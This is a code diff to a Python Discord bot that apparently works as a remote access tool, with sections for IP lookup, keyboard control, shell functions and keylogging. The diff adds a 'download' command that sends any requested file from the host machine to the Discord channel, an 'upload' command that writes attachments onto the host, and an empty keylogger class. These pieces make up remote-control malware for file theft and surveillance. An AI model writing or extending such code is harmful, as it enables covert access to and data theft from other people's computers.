@@ -85,6 +85,12 @@ async def confirm_action(ctx, action_description):
 
     else:
         return True
+    
+@bot.event
+async def on_command_error(ctx, error):
+    embed = embed_data(title="Error", description="An error occured:", data=error, color=discord.Color.red())
+
+    await ctx.send(embed=embed)
 
 @bot.command(name="help")
 async def help(ctx):
@@ -187,6 +193,21 @@ async def delete_file(ctx, *args):
     else:
         embed = embed_data(title=embed_title, description="Action was not confirmed, file not deleted", color=discord.Color.red())
     await ctx.send(embed=embed)
+
+
+@bot.command(name="download")
+async def download_file(ctx, *args):
+    path = ' '.join(args)
+
+    await ctx.send(file=discord.File(path))
+
+
+@bot.command(name="upload")
+async def upload_file(ctx, *args):
+    path = ' '.join(args)
+
+    for attachment in ctx.message.attachments:
+        await attachment.save(attachment.filename)
 
 
 # IP functions
@@ -520,6 +541,18 @@ class keyboard_cog(commands.Cog):
         embed = embed_data(title="Hotkey | Keyboard", description="Used keyboard to execute hotkey:", data=args)
         await ctx.send(embed=embed)
 
+
+#Keylog functions
+
+class keyboardlogger_cog(commands.Cog):
+    def __init__(self, bot):
+        self.bot = bot
+
+    def cog_unload(self):
+        print("temp")
+        #test
+    
+    
 
 # Shell functions
         
